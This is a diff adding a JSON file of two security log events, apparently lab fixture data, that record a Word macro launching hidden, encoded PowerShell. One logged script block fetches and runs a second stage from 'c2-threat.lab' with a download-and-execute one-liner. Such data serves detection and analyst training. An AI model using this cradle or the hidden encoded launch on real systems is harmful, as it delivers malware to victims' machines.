@@ -1,0 +1,25 @@
+[
+  {
+    "_time": "2026-04-18 15:10:12",
+    "EventCode": "Sysmon 1",
+    "Computer": "FIN-WS-09",
+    "User": "CORP\\cjohnson",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...",
+    "PID": 8944,
+    "Status": "Process Spawned",
+    "Description": "Suspicious child process spawned from Microsoft Word document macro"
+  },
+  {
+    "_time": "2026-04-18 15:10:14",
+    "EventCode": "4104",
+    "Computer": "FIN-WS-09",
+    "User": "CORP\\cjohnson",
+    "ScriptBlock": "IEX (New-Object Net.WebClient).DownloadString('http://c2-threat.lab/stage2.ps1'); [System.Reflection.Assembly]::Load($payload);",
+    "CommandLine": "IEX DownloadString http://c2-threat.lab/stage2.ps1",
+    "Suspicion": 90,
+    "Status": "0x0",
+    "Description": "PowerShell ScriptBlock execution downloading secondary remote stage payload"
+  }
+]
